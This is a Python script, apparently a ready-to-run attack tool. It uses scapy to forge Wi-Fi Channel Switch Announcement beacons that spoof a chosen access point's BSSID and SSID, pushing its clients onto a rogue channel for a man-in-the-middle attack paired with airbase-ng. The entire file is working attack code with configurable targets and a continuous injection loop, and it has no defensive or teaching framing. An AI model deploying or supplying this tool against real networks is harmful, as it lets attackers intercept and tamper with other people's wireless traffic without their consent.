#!/usr/bin/env python3
"""Continuous CSA beacon injection for multi-channel MITM.
Usage: python3 csa_inject.py <interface> [bssid] [ssid] [real_ch] [rogue_ch]

Injects forged CSA beacons spoofing the target AP to push clients
from <real_ch> to <rogue_ch>. Use alongside airbase-ng on second interface.
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import sys, os, time

# ── Configuration ──────────────────────────────────────────────────────────
IFACE     = sys.argv[1] if len(sys.argv) > 1 else 'wlan2'
BSSID     = sys.argv[2] if len(sys.argv) > 2 else 'b4:fb:e4:47:98:bf'
SSID      = sys.argv[3] if len(sys.argv) > 3 else 'EPCOT'
REAL_CH   = int(sys.argv[4]) if len(sys.argv) > 4 else 1
ROGUE_CH  = int(sys.argv[5]) if len(sys.argv) > 5 else 6
COUNT     = 2         # switch after 2 beacon intervals (~200ms)
RATE      = 0.05      # 20 CSAs/second

# ── Build CSA beacon ───────────────────────────────────────────────────────
os.system(f'iw dev {IFACE} set channel {REAL_CH}')

csa  = Dot11Elt(ID=37, info=bytes([0x01, ROGUE_CH, COUNT]))
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
              addr2=BSSID, addr3=BSSID)
beacon = Dot11Beacon(cap='ESS+privacy')
essid  = Dot11Elt(ID='SSID', info=SSID.encode())
rates  = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
dsss   = Dot11Elt(ID='DSset', info=bytes([REAL_CH]))
# Minimal RSN IE (WPA2 CCMP PSK) so clients recognize the beacon
rsn    = Dot11Elt(ID=48, info=b'\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00')

frame = RadioTap() / dot11 / beacon / essid / rates / dsss / rsn / csa

print(f'CSA: {SSID} ch{REAL_CH} -> ch{ROGUE_CH}  count={COUNT}  iface={IFACE}')
print(f'Frame: {len(frame)} bytes, injecting at {int(1/RATE)}/sec')
print('Ctrl+C to stop')

count = 0
try:
    while True:
        sendp(frame, iface=IFACE, count=1, verbose=False)
        count += 1
        if count % 500 == 0:
            print(f'  {count} CSA beacons sent')
        time.sleep(RATE)
except KeyboardInterrupt:
    print(f'\nTotal: {count} CSA beacons injected')
